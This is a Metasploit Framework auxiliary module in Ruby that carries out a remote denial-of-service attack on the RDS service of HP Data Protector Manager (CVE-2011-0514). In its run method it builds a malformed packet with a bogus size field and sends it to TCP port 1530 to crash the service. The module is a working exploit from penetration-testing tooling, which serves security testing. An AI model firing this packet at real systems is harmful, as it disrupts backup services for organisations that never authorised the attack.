##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	Rank = ManualRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'HP Data Protector Manager RDS DOS',
			'Description' => %q{
					This module causes a remote DOS on HP Data Protector's RDS service.  By sending
				a malformed packet to port 1530, _rm32.dll causes RDS to crash due to an enormous
				size for malloc().
			},
			'Author'      =>
				[
					'Roi Mallo <rmallof[at]gmail.com>',  #initial discovery, poc
					'sinn3r',                            #msf
				],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'CVE', '2011-0514' ],
					[ 'OSVDB', '70617' ],
					[ 'EDB', '15940' ],
				],
			'DisclosureDate' => 'Jan 8 2011' ))

		register_options([
			Opt::RPORT(1530),
		])
	end

	def run
		buf  = "\x23\x8c\x29\xb6"  #Header
		buf << "\x64\x00\x00\x00"  #Packet size
		buf << "\x41"*4            #Data

		connect
		print_status("Sending malformed packet...")
		sock.put(buf)
		disconnect
	end
end
